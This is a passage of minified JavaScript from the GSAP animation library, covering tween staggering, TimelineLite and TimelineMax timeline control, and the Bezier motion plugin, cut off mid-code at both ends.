f,p,m,d,g=n.delay||0,v=[],y=function(){n.onComplete&&n.onComplete.apply(n.onCompleteScope||this,arguments),l.apply(c||n.callbackScope||this,u||_)};for(h(t)||("string"==typeof t&&(t=i.selector(t)||t),o(t)&&(t=s(t))),t=t||[],0>a&&(t=s(t),t.reverse(),a*=-1),f=t.length-1,m=0;f>=m;m++){p={};for(d in n)p[d]=n[d];p.delay=g,m===f&&l&&(p.onComplete=y),v[m]=new r(t[m],e,p),g+=a}return v},r.staggerFrom=r.allFrom=function(t,e,i,s,n,a,o){return i.runBackwards=!0,i.immediateRender=0!=i.immediateRender,r.staggerTo(t,e,i,s,n,a,o)},r.staggerFromTo=r.allFromTo=function(t,e,i,s,n,a,o,h){return s.startAt=i,s.immediateRender=0!=s.immediateRender&&0!=i.immediateRender,r.staggerTo(t,e,s,n,a,o,h)},r.delayedCall=function(t,e,i,s,n){return new r(e,0,{delay:t,onComplete:e,onCompleteParams:i,callbackScope:s,onReverseComplete:e,onReverseCompleteParams:i,immediateRender:!1,useFrames:n,overwrite:0})},r.set=function(t,e){return new r(t,0,e)},r.isTweening=function(t){return i.getTweensOf(t,!0).length>0};var u=function(t,e){for(var s=[],r=0,n=t._first;n;)n instanceof i?s[r++]=n:(e&&(s[r++]=n),s=s.concat(u(n,e)),r=s.length),n=n._next;return s},c=r.getAllTweens=function(e){return u(t._rootTimeline,e).concat(u(t._rootFramesTimeline,e))};r.killAll=function(t,i,s,r){null==i&&(i=!0),null==s&&(s=!0);var n,a,o,h=c(0!=r),l=h.length,_=i&&s&&r;for(o=0;l>o;o++)a=h[o],(_||a instanceof e||(n=a.target===a.vars.onComplete)&&s||i&&!n)&&(t?a.totalTime(a._reversed?0:a.totalDuration()):a._enabled(!1,!1))},r.killChildTweensOf=function(t,e){if(null!=t){var n,l,_,u,c,f=a.tweenLookup;if("string"==typeof t&&(t=i.selector(t)||t),o(t)&&(t=s(t)),h(t))for(u=t.length;--u>-1;)r.killChildTweensOf(t[u],e);else{n=[];for(_ in f)for(l=f[_].target.parentNode;l;)l===t&&(n=n.concat(f[_].tweens)),l=l.parentNode;for(c=n.length,u=0;c>u;u++)e&&n[u].totalTime(n[u].totalDuration()),n[u]._enabled(!1,!1)}}};var f=function(t,i,s,r){i=i!==!1,s=s!==!1,r=r!==!1;for(var n,a,o=c(r),h=i&&s&&r,l=o.length;--l>-1;)a=o[l],(h||a instanceof e||(n=a.target===a.vars.onComplete)&&s||i&&!n)&&a.paused(t)};return r.pauseAll=function(t,e,i){f(!0,t,e,i)},r.resumeAll=function(t,e,i){f(!1,t,e,i)},r.globalTimeScale=function(e){var s=t._rootTimeline,r=i.ticker.time;return arguments.length?(e=e||n,s._startTime=r-(r-s._startTime)*s._timeScale/e,s=t._rootFramesTimeline,r=i.ticker.frame,s._startTime=r-(r-s._startTime)*s._timeScale/e,s._timeScale=t._rootTimeline._timeScale=e,e):s._timeScale},l.progress=function(t){return arguments.length?this.totalTime(this.duration()*(this._yoyo&&0!==(1&this._cycle)?1-t:t)+this._cycle*(this._duration+this._repeatDelay),!1):this._time/this.duration()},l.totalProgress=function(t){return arguments.length?this.totalTime(this.totalDuration()*t,!1):this._totalTime/this.totalDuration()},l.time=function(t,e){return arguments.length?(this._dirty&&this.totalDuration(),t>this._duration&&(t=this._duration),this._yoyo&&0!==(1&this._cycle)?t=this._duration-t+this._cycle*(this._duration+this._repeatDelay):0!==this._repeat&&(t+=this._cycle*(this._duration+this._repeatDelay)),this.totalTime(t,e)):this._time},l.duration=function(e){return arguments.length?t.prototype.duration.call(this,e):this._duration},l.totalDuration=function(t){return arguments.length?-1===this._repeat?this:this.duration((t-this._repeat*this._repeatDelay)/(this._repeat+1)):(this._dirty&&(this._totalDuration=-1===this._repeat?999999999999:this._duration*(this._repeat+1)+this._repeatDelay*this._repeat,this._dirty=!1),this._totalDuration)},l.repeat=function(t){return arguments.length?(this._repeat=t,this._uncache(!0)):this._repeat},l.repeatDelay=function(t){return arguments.length?(this._repeatDelay=t,this._uncache(!0)):this._repeatDelay},l.yoyo=function(t){return arguments.length?(this._yoyo=t,this):this._yoyo},r},!0),_gsScope._gsDefine("TimelineLite",["core.Animation","core.SimpleTimeline","TweenLite"],function(t,e,i){var s=function(t){e.call(this,t),this._labels={},this.autoRemoveChildren=this.vars.autoRemoveChildren===!0,this.smoothChildTiming=this.vars.smoothChildTiming===!0,this._sortChildren=!0,this._onUpdate=this.vars.onUpdate;var i,s,r=this.vars;for(s in r)i=r[s],h(i)&&-1!==i.join("").indexOf("{self}")&&(r[s]=this._swapSelfInParams(i));h(r.tweens)&&this.add(r.tweens,0,r.align,r.stagger)},r=1e-10,n=i._internals,a=s._internals={},o=n.isSelector,h=n.isArray,l=n.lazyTweens,_=n.lazyRender,u=[],c=_gsScope._gsDefine.globals,f=function(t){var e,i={};for(e in t)i[e]=t[e];return i},p=a.pauseCallback=function(t,e,i,s){var n,a=t._timeline,o=a._totalTime,h=t._startTime,l=t._rawPrevTime<0||0===t._rawPrevTime&&a._reversed,_=l?0:r,c=l?r:0;if(e||!this._forcingPlayhead){for(a.pause(h),n=t._prev;n&&n._startTime===h;)n._rawPrevTime=c,n=n._prev;for(n=t._next;n&&n._startTime===h;)n._rawPrevTime=_,n=n._next;e&&e.apply(s||a.vars.callbackScope||a,i||u),(this._forcingPlayhead||!a._paused)&&a.seek(o)}},m=function(t){var e,i=[],s=t.length;for(e=0;e!==s;i.push(t[e++]));return i},d=s.prototype=new e;return s.version="1.17.0",d.constructor=s,d.kill()._gc=d._forcingPlayhead=!1,d.to=function(t,e,s,r){var n=s.repeat&&c.TweenMax||i;return e?this.add(new n(t,e,s),r):this.set(t,s,r)},d.from=function(t,e,s,r){return this.add((s.repeat&&c.TweenMax||i).from(t,e,s),r)},d.fromTo=function(t,e,s,r,n){var a=r.repeat&&c.TweenMax||i;return e?this.add(a.fromTo(t,e,s,r),n):this.set(t,r,n)},d.staggerTo=function(t,e,r,n,a,h,l,_){var u,c=new s({onComplete:h,onCompleteParams:l,callbackScope:_,smoothChildTiming:this.smoothChildTiming});for("string"==typeof t&&(t=i.selector(t)||t),t=t||[],o(t)&&(t=m(t)),n=n||0,0>n&&(t=m(t),t.reverse(),n*=-1),u=0;u<t.length;u++)r.startAt&&(r.startAt=f(r.startAt)),c.to(t[u],e,f(r),u*n);return this.add(c,a)},d.staggerFrom=function(t,e,i,s,r,n,a,o){return i.immediateRender=0!=i.immediateRender,i.runBackwards=!0,this.staggerTo(t,e,i,s,r,n,a,o)},d.staggerFromTo=function(t,e,i,s,r,n,a,o,h){return s.startAt=i,s.immediateRender=0!=s.immediateRender&&0!=i.immediateRender,this.staggerTo(t,e,s,r,n,a,o,h)},d.call=function(t,e,s,r){return this.add(i.delayedCall(0,t,e,s),r)},d.set=function(t,e,s){return s=this._parseTimeOrLabel(s,0,!0),null==e.immediateRender&&(e.immediateRender=s===this._time&&!this._paused),this.add(new i(t,0,e),s)},s.exportRoot=function(t,e){t=t||{},null==t.smoothChildTiming&&(t.smoothChildTiming=!0);var r,n,a=new s(t),o=a._timeline;for(null==e&&(e=!0),o._remove(a,!0),a._startTime=0,a._rawPrevTime=a._time=a._totalTime=o._time,r=o._first;r;)n=r._next,e&&r instanceof i&&r.target===r.vars.onComplete||a.add(r,r._startTime-r._delay),r=n;return o.add(a,0),a},d.add=function(r,n,a,o){var l,_,u,c,f,p;if("number"!=typeof n&&(n=this._parseTimeOrLabel(n,0,!0,r)),!(r instanceof t)){if(r instanceof Array||r&&r.push&&h(r)){for(a=a||"normal",o=o||0,l=n,_=r.length,u=0;_>u;u++)h(c=r[u])&&(c=new s({tweens:c})),this.add(c,l),"string"!=typeof c&&"function"!=typeof c&&("sequence"===a?l=c._startTime+c.totalDuration()/c._timeScale:"start"===a&&(c._startTime-=c.delay())),l+=o;return this._uncache(!0)}if("string"==typeof r)return this.addLabel(r,n);if("function"!=typeof r)throw"Cannot add "+r+" into the timeline; it is not a tween, timeline, function, or string.";r=i.delayedCall(0,r)}if(e.prototype.add.call(this,r,n),(this._gc||this._time===this._duration)&&!this._paused&&this._duration<this.duration())for(f=this,p=f.rawTime()>r._startTime;f._timeline;)p&&f._timeline.smoothChildTiming?f.totalTime(f._totalTime,!0):f._gc&&f._enabled(!0,!1),f=f._timeline;return this},d.remove=function(e){if(e instanceof t)return this._remove(e,!1);if(e instanceof Array||e&&e.push&&h(e)){for(var i=e.length;--i>-1;)this.remove(e[i]);return this}return"string"==typeof e?this.removeLabel(e):this.kill(null,e)},d._remove=function(t,i){e.prototype._remove.call(this,t,i);var s=this._last;return s?this._time>s._startTime+s._totalDuration/s._timeScale&&(this._time=this.duration(),this._totalTime=this._totalDuration):this._time=this._totalTime=this._duration=this._totalDuration=0,this},d.append=function(t,e){return this.add(t,this._parseTimeOrLabel(null,e,!0,t))},d.insert=d.insertMultiple=function(t,e,i,s){return this.add(t,e||0,i,s)},d.appendMultiple=function(t,e,i,s){return this.add(t,this._parseTimeOrLabel(null,e,!0,t),i,s)},d.addLabel=function(t,e){return this._labels[t]=this._parseTimeOrLabel(e),this},d.addPause=function(t,e,s,r){var n=i.delayedCall(0,p,["{self}",e,s,r],this);return n.data="isPause",this.add(n,t)},d.removeLabel=function(t){return delete this._labels[t],this},d.getLabelTime=function(t){return null!=this._labels[t]?this._labels[t]:-1},d._parseTimeOrLabel=function(e,i,s,r){var n;if(r instanceof t&&r.timeline===this)this.remove(r);else if(r&&(r instanceof Array||r.push&&h(r)))for(n=r.length;--n>-1;)r[n]instanceof t&&r[n].timeline===this&&this.remove(r[n]);if("string"==typeof i)return this._parseTimeOrLabel(i,s&&"number"==typeof e&&null==this._labels[i]?e-this.duration():0,s);if(i=i||0,"string"!=typeof e||!isNaN(e)&&null==this._labels[e])null==e&&(e=this.duration());else{if(n=e.indexOf("="),-1===n)return null==this._labels[e]?s?this._labels[e]=this.duration()+i:i:this._labels[e]+i;i=parseInt(e.charAt(n-1)+"1",10)*Number(e.substr(n+1)),e=n>1?this._parseTimeOrLabel(e.substr(0,n-1),0,s):this.duration()}return Number(e)+i},d.seek=function(t,e){return this.totalTime("number"==typeof t?t:this._parseTimeOrLabel(t),e!==!1)},d.stop=function(){return this.paused(!0)},d.gotoAndPlay=function(t,e){return this.play(t,e)},d.gotoAndStop=function(t,e){return this.pause(t,e)},d.render=function(t,e,i){this._gc&&this._enabled(!0,!1);var s,n,a,o,h,u=this._dirty?this.totalDuration():this._totalDuration,c=this._time,f=this._startTime,p=this._timeScale,m=this._paused;if(t>=u)this._totalTime=this._time=u,this._reversed||this._hasPausedChild()||(n=!0,o="onComplete",h=!!this._timeline.autoRemoveChildren,0===this._duration&&(0===t||this._rawPrevTime<0||this._rawPrevTime===r)&&this._rawPrevTime!==t&&this._first&&(h=!0,this._rawPrevTime>r&&(o="onReverseComplete"))),this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:r,t=u+1e-4;else if(1e-7>t)if(this._totalTime=this._time=0,(0!==c||0===this._duration&&this._rawPrevTime!==r&&(this._rawPrevTime>0||0>t&&this._rawPrevTime>=0))&&(o="onReverseComplete",n=this._reversed),0>t)this._active=!1,this._timeline.autoRemoveChildren&&this._reversed?(h=n=!0,o="onReverseComplete"):this._rawPrevTime>=0&&this._first&&(h=!0),this._rawPrevTime=t;else{if(this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:r,0===t&&n)for(s=this._first;s&&0===s._startTime;)s._duration||(n=!1),s=s._next;t=0,this._initted||(h=!0)}else this._totalTime=this._time=this._rawPrevTime=t;if(this._time!==c&&this._first||i||h){if(this._initted||(this._initted=!0),this._active||!this._paused&&this._time!==c&&t>0&&(this._active=!0),0===c&&this.vars.onStart&&0!==this._time&&(e||this._callback("onStart")),this._time>=c)for(s=this._first;s&&(a=s._next,!this._paused||m);)(s._active||s._startTime<=this._time&&!s._paused&&!s._gc)&&(s._reversed?s.render((s._dirty?s.totalDuration():s._totalDuration)-(t-s._startTime)*s._timeScale,e,i):s.render((t-s._startTime)*s._timeScale,e,i)),s=a;else for(s=this._last;s&&(a=s._prev,!this._paused||m);)(s._active||s._startTime<=c&&!s._paused&&!s._gc)&&(s._reversed?s.render((s._dirty?s.totalDuration():s._totalDuration)-(t-s._startTime)*s._timeScale,e,i):s.render((t-s._startTime)*s._timeScale,e,i)),s=a;this._onUpdate&&(e||(l.length&&_(),this._callback("onUpdate"))),o&&(this._gc||(f===this._startTime||p!==this._timeScale)&&(0===this._time||u>=this.totalDuration())&&(n&&(l.length&&_(),this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[o]&&this._callback(o)))}},d._hasPausedChild=function(){for(var t=this._first;t;){if(t._paused||t instanceof s&&t._hasPausedChild())return!0;t=t._next}return!1},d.getChildren=function(t,e,s,r){r=r||-9999999999;for(var n=[],a=this._first,o=0;a;)a._startTime<r||(a instanceof i?e!==!1&&(n[o++]=a):(s!==!1&&(n[o++]=a),t!==!1&&(n=n.concat(a.getChildren(!0,e,s)),o=n.length))),a=a._next;return n},d.getTweensOf=function(t,e){var s,r,n=this._gc,a=[],o=0;for(n&&this._enabled(!0,!0),s=i.getTweensOf(t),r=s.length;--r>-1;)(s[r].timeline===this||e&&this._contains(s[r]))&&(a[o++]=s[r]);return n&&this._enabled(!1,!0),a},d.recent=function(){return this._recent},d._contains=function(t){for(var e=t.timeline;e;){if(e===this)return!0;e=e.timeline}return!1},d.shiftChildren=function(t,e,i){i=i||0;for(var s,r=this._first,n=this._labels;r;)r._startTime>=i&&(r._startTime+=t),r=r._next;if(e)for(s in n)n[s]>=i&&(n[s]+=t);return this._uncache(!0)},d._kill=function(t,e){if(!t&&!e)return this._enabled(!1,!1);for(var i=e?this.getTweensOf(e):this.getChildren(!0,!0,!1),s=i.length,r=!1;--s>-1;)i[s]._kill(t,e)&&(r=!0);return r},d.clear=function(t){var e=this.getChildren(!1,!0,!0),i=e.length;for(this._time=this._totalTime=0;--i>-1;)e[i]._enabled(!1,!1);return t!==!1&&(this._labels={}),this._uncache(!0)},d.invalidate=function(){for(var e=this._first;e;)e.invalidate(),e=e._next;return t.prototype.invalidate.call(this)},d._enabled=function(t,i){if(t===this._gc)for(var s=this._first;s;)s._enabled(t,!0),s=s._next;return e.prototype._enabled.call(this,t,i)},d.totalTime=function(e,i,s){this._forcingPlayhead=!0;var r=t.prototype.totalTime.apply(this,arguments);return this._forcingPlayhead=!1,r},d.duration=function(t){return arguments.length?(0!==this.duration()&&0!==t&&this.timeScale(this._duration/t),this):(this._dirty&&this.totalDuration(),this._duration)},d.totalDuration=function(t){if(!arguments.length){if(this._dirty){for(var e,i,s=0,r=this._last,n=999999999999;r;)e=r._prev,r._dirty&&r.totalDuration(),r._startTime>n&&this._sortChildren&&!r._paused?this.add(r,r._startTime-r._delay):n=r._startTime,r._startTime<0&&!r._paused&&(s-=r._startTime,this._timeline.smoothChildTiming&&(this._startTime+=r._startTime/this._timeScale),this.shiftChildren(-r._startTime,!1,-9999999999),n=0),i=r._startTime+r._totalDuration/r._timeScale,i>s&&(s=i),r=e;this._duration=this._totalDuration=s,this._dirty=!1}return this._totalDuration}return 0!==this.totalDuration()&&0!==t&&this.timeScale(this._totalDuration/t),this},d.paused=function(e){if(!e)for(var i=this._first,s=this._time;i;)i._startTime===s&&"isPause"===i.data&&(i._rawPrevTime=0),i=i._next;return t.prototype.paused.apply(this,arguments)},d.usesFrames=function(){for(var e=this._timeline;e._timeline;)e=e._timeline;return e===t._rootFramesTimeline},d.rawTime=function(){return this._paused?this._totalTime:(this._timeline.rawTime()-this._startTime)*this._timeScale},s},!0),_gsScope._gsDefine("TimelineMax",["TimelineLite","TweenLite","easing.Ease"],function(t,e,i){var s=function(e){t.call(this,e),this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._cycle=0,this._yoyo=this.vars.yoyo===!0,this._dirty=!0},r=1e-10,n=e._internals,a=n.lazyTweens,o=n.lazyRender,h=new i(null,null,1,0),l=s.prototype=new t;return l.constructor=s,l.kill()._gc=!1,s.version="1.17.0",l.invalidate=function(){return this._yoyo=this.vars.yoyo===!0,this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._uncache(!0),t.prototype.invalidate.call(this)},l.addCallback=function(t,i,s,r){return this.add(e.delayedCall(0,t,s,r),i)},l.removeCallback=function(t,e){if(t)if(null==e)this._kill(null,t);else for(var i=this.getTweensOf(t,!1),s=i.length,r=this._parseTimeOrLabel(e);--s>-1;)i[s]._startTime===r&&i[s]._enabled(!1,!1);return this},l.removePause=function(e){return this.removeCallback(t._internals.pauseCallback,e)},l.tweenTo=function(t,i){i=i||{};var s,r,n,a={ease:h,useFrames:this.usesFrames(),immediateRender:!1};for(r in i)a[r]=i[r];return a.time=this._parseTimeOrLabel(t),s=Math.abs(Number(a.time)-this._time)/this._timeScale||.001,n=new e(this,s,a),a.onStart=function(){n.target.paused(!0),n.vars.time!==n.target.time()&&s===n.duration()&&n.duration(Math.abs(n.vars.time-n.target.time())/n.target._timeScale),i.onStart&&n._callback("onStart")},n},l.tweenFromTo=function(t,e,i){i=i||{},t=this._parseTimeOrLabel(t),i.startAt={onComplete:this.seek,onCompleteParams:[t],callbackScope:this},i.immediateRender=i.immediateRender!==!1;var s=this.tweenTo(e,i);return s.duration(Math.abs(s.vars.time-t)/this._timeScale||.001)},l.render=function(t,e,i){this._gc&&this._enabled(!0,!1);var s,n,h,l,_,u,c=this._dirty?this.totalDuration():this._totalDuration,f=this._duration,p=this._time,m=this._totalTime,d=this._startTime,g=this._timeScale,v=this._rawPrevTime,y=this._paused,T=this._cycle;if(t>=c)this._locked||(this._totalTime=c,this._cycle=this._repeat),this._reversed||this._hasPausedChild()||(n=!0,l="onComplete",_=!!this._timeline.autoRemoveChildren,0===this._duration&&(0===t||0>v||v===r)&&v!==t&&this._first&&(_=!0,v>r&&(l="onReverseComplete"))),this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:r,this._yoyo&&0!==(1&this._cycle)?this._time=t=0:(this._time=f,t=f+1e-4);else if(1e-7>t)if(this._locked||(this._totalTime=this._cycle=0),this._time=0,(0!==p||0===f&&v!==r&&(v>0||0>t&&v>=0)&&!this._locked)&&(l="onReverseComplete",n=this._reversed),0>t)this._active=!1,this._timeline.autoRemoveChildren&&this._reversed?(_=n=!0,l="onReverseComplete"):v>=0&&this._first&&(_=!0),this._rawPrevTime=t;else{if(this._rawPrevTime=f||!e||t||this._rawPrevTime===t?t:r,0===t&&n)for(s=this._first;s&&0===s._startTime;)s._duration||(n=!1),s=s._next;t=0,this._initted||(_=!0)}else 0===f&&0>v&&(_=!0),this._time=this._rawPrevTime=t,this._locked||(this._totalTime=t,0!==this._repeat&&(u=f+this._repeatDelay,this._cycle=this._totalTime/u>>0,0!==this._cycle&&this._cycle===this._totalTime/u&&this._cycle--,this._time=this._totalTime-this._cycle*u,this._yoyo&&0!==(1&this._cycle)&&(this._time=f-this._time),this._time>f?(this._time=f,t=f+1e-4):this._time<0?this._time=t=0:t=this._time));if(this._cycle!==T&&!this._locked){var x=this._yoyo&&0!==(1&T),w=x===(this._yoyo&&0!==(1&this._cycle)),b=this._totalTime,P=this._cycle,k=this._rawPrevTime,O=this._time;if(this._totalTime=T*f,this._cycle<T?x=!x:this._totalTime+=f,this._time=p,this._rawPrevTime=0===f?v-1e-4:v,this._cycle=T,this._locked=!0,p=x?0:f,this.render(p,e,0===f),e||this._gc||this.vars.onRepeat&&this._callback("onRepeat"),w&&(p=x?f+1e-4:-1e-4,this.render(p,!0,!1)),this._locked=!1,this._paused&&!y)return;this._time=O,this._totalTime=b,this._cycle=P,this._rawPrevTime=k}if(!(this._time!==p&&this._first||i||_))return void(m!==this._totalTime&&this._onUpdate&&(e||this._callback("onUpdate")));if(this._initted||(this._initted=!0),this._active||!this._paused&&this._totalTime!==m&&t>0&&(this._active=!0),0===m&&this.vars.onStart&&0!==this._totalTime&&(e||this._callback("onStart")),this._time>=p)for(s=this._first;s&&(h=s._next,!this._paused||y);)(s._active||s._startTime<=this._time&&!s._paused&&!s._gc)&&(s._reversed?s.render((s._dirty?s.totalDuration():s._totalDuration)-(t-s._startTime)*s._timeScale,e,i):s.render((t-s._startTime)*s._timeScale,e,i)),s=h;else for(s=this._last;s&&(h=s._prev,!this._paused||y);)(s._active||s._startTime<=p&&!s._paused&&!s._gc)&&(s._reversed?s.render((s._dirty?s.totalDuration():s._totalDuration)-(t-s._startTime)*s._timeScale,e,i):s.render((t-s._startTime)*s._timeScale,e,i)),s=h;this._onUpdate&&(e||(a.length&&o(),this._callback("onUpdate"))),l&&(this._locked||this._gc||(d===this._startTime||g!==this._timeScale)&&(0===this._time||c>=this.totalDuration())&&(n&&(a.length&&o(),this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[l]&&this._callback(l)))},l.getActive=function(t,e,i){null==t&&(t=!0),null==e&&(e=!0),null==i&&(i=!1);var s,r,n=[],a=this.getChildren(t,e,i),o=0,h=a.length;for(s=0;h>s;s++)r=a[s],r.isActive()&&(n[o++]=r);return n},l.getLabelAfter=function(t){t||0!==t&&(t=this._time);var e,i=this.getLabelsArray(),s=i.length;for(e=0;s>e;e++)if(i[e].time>t)return i[e].name;return null},l.getLabelBefore=function(t){null==t&&(t=this._time);for(var e=this.getLabelsArray(),i=e.length;--i>-1;)if(e[i].time<t)return e[i].name;return null},l.getLabelsArray=function(){var t,e=[],i=0;for(t in this._labels)e[i++]={time:this._labels[t],name:t};return e.sort(function(t,e){return t.time-e.time}),e},l.progress=function(t,e){return arguments.length?this.totalTime(this.duration()*(this._yoyo&&0!==(1&this._cycle)?1-t:t)+this._cycle*(this._duration+this._repeatDelay),e):this._time/this.duration()},l.totalProgress=function(t,e){return arguments.length?this.totalTime(this.totalDuration()*t,e):this._totalTime/this.totalDuration()},l.totalDuration=function(e){return arguments.length?-1===this._repeat?this:this.duration((e-this._repeat*this._repeatDelay)/(this._repeat+1)):(this._dirty&&(t.prototype.totalDuration.call(this),this._totalDuration=-1===this._repeat?999999999999:this._duration*(this._repeat+1)+this._repeatDelay*this._repeat),this._totalDuration)},l.time=function(t,e){return arguments.length?(this._dirty&&this.totalDuration(),t>this._duration&&(t=this._duration),this._yoyo&&0!==(1&this._cycle)?t=this._duration-t+this._cycle*(this._duration+this._repeatDelay):0!==this._repeat&&(t+=this._cycle*(this._duration+this._repeatDelay)),this.totalTime(t,e)):this._time},l.repeat=function(t){return arguments.length?(this._repeat=t,this._uncache(!0)):this._repeat},l.repeatDelay=function(t){return arguments.length?(this._repeatDelay=t,this._uncache(!0)):this._repeatDelay},l.yoyo=function(t){return arguments.length?(this._yoyo=t,this):this._yoyo},l.currentLabel=function(t){return arguments.length?this.seek(t,!0):this.getLabelBefore(this._time+1e-8)},s},!0),function(){var t=180/Math.PI,e=[],i=[],s=[],r={},n=_gsScope._gsDefine.globals,a=function(t,e,i,s){this.a=t,this.b=e,this.c=i,this.d=s,this.da=s-t,this.ca=i-t,this.ba=e-t},o=",x,y,z,left,top,right,bottom,marginTop,marginLeft,marginRight,marginBottom,paddingLeft,paddingTop,paddingRight,paddingBottom,backgroundPosition,backgroundPosition_y,",h=function(t,e,i,s){var r={a:t},n={},a={},o={c:s},h=(t+e)/2,l=(e+i)/2,_=(i+s)/2,u=(h+l)/2,c=(l+_)/2,f=(c-u)/8;return r.b=h+(t-h)/4,n.b=u+f,r.c=n.a=(r.b+n.b)/2,n.c=a.a=(u+c)/2,a.b=c-f,o.b=_+(s-_)/4,a.c=o.a=(a.b+o.b)/2,[r,n,a,o]},l=function(t,r,n,a,o){var l,_,u,c,f,p,m,d,g,v,y,T,x,w=t.length-1,b=0,P=t[0].a;for(l=0;w>l;l++)f=t[b],_=f.a,u=f.d,c=t[b+1].d,o?(y=e[l],T=i[l],x=(T+y)*r*.25/(a?.5:s[l]||.5),p=u-(u-_)*(a?.5*r:0!==y?x/y:0),m=u+(c-u)*(a?.5*r:0!==T?x/T:0),d=u-(p+((m-p)*(3*y/(y+T)+.5)/4||0))):(p=u-(u-_)*r*.5,m=u+(c-u)*r*.5,d=u-(p+m)/2),p+=d,m+=d,f.c=g=p,0!==l?f.b=P:f.b=P=f.a+.6*(f.c-f.a),f.da=u-_,f.ca=g-_,f.ba=P-_,n?(v=h(_,P,g,u),t.splice(b,1,v[0],v[1],v[2],v[3]),b+=4):b++,P=m;f=t[b],f.b=P,f.c=P+.4*(f.d-P),f.da=f.d-f.a,f.ca=f.c-f.a,f.ba=P-f.a,n&&(v=h(f.a,P,f.c,f.d),t.splice(b,1,v[0],v[1],v[2],v[3]))},_=function(t,s,r,n){var o,h,l,_,u,c,f=[];if(n)for(t=[n].concat(t),h=t.length;--h>-1;)"string"==typeof(c=t[h][s])&&"="===c.charAt(1)&&(t[h][s]=n[s]+Number(c.charAt(0)+c.substr(2)));if(o=t.length-2,0>o)return f[0]=new a(t[0][s],0,0,t[-1>o?0:1][s]),f;for(h=0;o>h;h++)l=t[h][s],_=t[h+1][s],f[h]=new a(l,0,0,_),r&&(u=t[h+2][s],e[h]=(e[h]||0)+(_-l)*(_-l),i[h]=(i[h]||0)+(u-_)*(u-_));return f[h]=new a(t[h][s],0,0,t[h+1][s]),f},u=function(t,n,a,h,u,c){var f,p,m,d,g,v,y,T,x={},w=[],b=c||t[0];u="string"==typeof u?","+u+",":o,null==n&&(n=1);for(p in t[0])w.push(p);if(t.length>1){for(T=t[t.length-1],y=!0,f=w.length;--f>-1;)if(p=w[f],Math.abs(b[p]-T[p])>.05){y=!1;break}y&&(t=t.concat(),c&&t.unshift(c),t.push(t[1]),c=t[t.length-3])}for(e.length=i.length=s.length=0,f=w.length;--f>-1;)p=w[f],r[p]=-1!==u.indexOf(","+p+","),x[p]=_(t,p,r[p],c);for(f=e.length;--f>-1;)e[f]=Math.sqrt(e[f]),i[f]=Math.sqrt(i[f]);if(!h){for(f=w.length;--f>-1;)if(r[p])for(m=x[w[f]],v=m.length-1,d=0;v>d;d++)g=m[d+1].da/i[d]+m[d].da/e[d],s[d]=(s[d]||0)+g*g;for(f=s.length;--f>-1;)s[f]=Math.sqrt(s[f])}for(f=w.length,d=a?4:1;--f>-1;)p=w[f],m=x[p],l(m,n,a,h,r[p]),y&&(m.splice(0,d),m.splice(m.length-d,d));return x},c=function(t,e,i){e=e||"soft";var s,r,n,o,h,l,_,u,c,f,p,m={},d="cubic"===e?3:2,g="soft"===e,v=[];if(g&&i&&(t=[i].concat(t)),null==t||t.length<d+1)throw"invalid Bezier data";for(c in t[0])v.push(c);for(l=v.length;--l>-1;){for(c=v[l],m[c]=h=[],f=0,u=t.length,_=0;u>_;_++)s=null==i?t[_][c]:"string"==typeof(p=t[_][c])&&"="===p.charAt(1)?i[c]+Number(p.charAt(0)+p.substr(2)):Number(p),g&&_>1&&u-1>_&&(h[f++]=(s+h[f-2])/2),h[f++]=s;for(u=f-d+1,f=0,_=0;u>_;_+=d)s=h[_],r=h[_+1],n=h[_+2],o=2===d?0:h[_+3],h[f++]=p=3===d?new a(s,r,n,o):new a(s,(2*r+s)/3,(2*r+n)/3,n);h.length=f}return m},f=function(t,e,i){for(var s,r,n,a,o,h,l,_,u,c,f,p=1/i,m=t.length;--m>-1;)for(c=t[m],n=c.a,a=c.d-n,o=c.c-n,h=c.b-n,s=r=0,_=1;i>=_;_++)l=p*_,u=1-l,s=r-(r=(l*l*a+3*u*(l*o+u*h))*l),f=m*i+_-1,e[f]=(e[f]||0)+s*s},p=function(t,e){e=e>>0||6;var i,s,r,n,a=[],o=[],h=0,l=0,_=e-1,u=[],c=[];for(i in t)f(t[i],a,e);for(r=a.length,s=0;r>s;s++)h+=Math.sqrt(a[s]),n=s%e,c[n]=h,n===_&&(l+=h,n=s/e>>0,u[n]=c,o[n]=l,h=0,c=[]);return{length:l,lengths:o,segments:u}},m=_gsScope._gsDefine.plugin({propName:"bezier",priority:-1,version:"1.3.4",API:2,global:!0,init:function(t,e,i){this._target=t,e instanceof Array&&(e={values:e}),this._func={},this._round={},this._props=[],this._timeRes=null==e.timeResolution?6:parseInt(e.timeResolution,10);var s,r,n,a,o,h=e.values||[],l={},_=h[0],f=e.autoRotate||i.vars.orientToBezier;this._autoRotate=f?f instanceof Array?f:[["x","y","rotation",f===!0?0:Number(f)||0]]:null;for(s in _)this._props.push(s);for(n=this._props.length;--n>-1;)s=this._props[n],this._overwriteProps.push(s),r=this._func[s]="function"==typeof t[s],l[s]=r?t[s.indexOf("set")||"function"!=typeof t["get"+s.substr(3)]?s:"get"+s.substr(3)]():parseFloat(t[s]),o||l[s]!==h[0][s]&&(o=l);if(this._beziers="cubic"!==e.type&&"quadratic"!==e.type&&"soft"!==e.type?u(h,isNaN(e.curviness)?1:e.curviness,!1,"thruBasic"===e.type,e.correlate,o):c(h,e.type,l),this._segCount=this._beziers[s].length,this._timeRes){var m=p(this._beziers,this._timeRes);this._length=m.length,this._lengths=m.lengths,this._segments=m.segments,this._l1=this._li=this._s1=this._si=0,this._l2=this._lengths[0],this._curSeg=this._segments[0],this._s2=this._curSeg[0],this._prec=1/this._curSeg.length}if(f=this._autoRotate)for(this._initialRotations=[],f[0]instanceof Array||(this._autoRotate=f=[f]),n=f.length;--n>-1;){for(a=0;3>a;a++)s=f[n][a],this._func[s]="function"==typeof t[s]?t[s.indexOf("set")||"function"!=typeof t["get"+s.substr(3)]?s:"get"+s.substr(3)]:!1;s=f[n][2],this._initialRotations[n]=this._func[s]?this._func[s].call(this._target):this._target[s]}return this._startRatio=i.vars.runBackwards?1:0,!0},set:function(e){var 